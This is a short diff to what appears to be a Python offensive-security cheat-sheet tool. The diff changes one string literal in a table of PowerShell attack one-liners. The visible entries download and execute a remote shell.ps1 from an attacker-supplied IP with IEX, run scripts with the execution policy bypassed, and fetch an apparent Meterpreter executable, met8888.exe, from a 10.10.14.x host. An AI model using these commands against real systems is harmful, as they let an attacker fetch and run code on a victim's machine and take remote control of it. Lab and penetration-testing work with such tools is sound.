@@ -520,7 +520,7 @@ def powershell():
         3 : ["Download and execute powershell script", f"IEX(New-Object Net.WebClient).downloadString('http://{source_ip}/shell.ps1')"],
         4 : ["Download and execute powershell script 2", f"IEX(IWR('http://{source_ip}/shell.ps1'))"],
         5 : ["Execute powershell script", f"powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File shell.ps1"],
-        6 : ["Download file with powershell", f"(new-object System.Net.WebClient).DownloadFile('http://10.10.14.143:8000/met8888.exe','C:\Users\mhope\Documents\met8888.exe')"],
+        6 : ["Download file with powershell", r"(new-object System.Net.WebClient).DownloadFile('http://10.10.14.143:8000/met8888.exe','C:\Users\mhope\Documents\met8888.exe')"],
         7 : ["Search for file", f"""Get-ChildItem -Path C:\ -Filter *[filename]* -Recurse -ErrorAction SilentlyContinue -Force"""]
     }
     
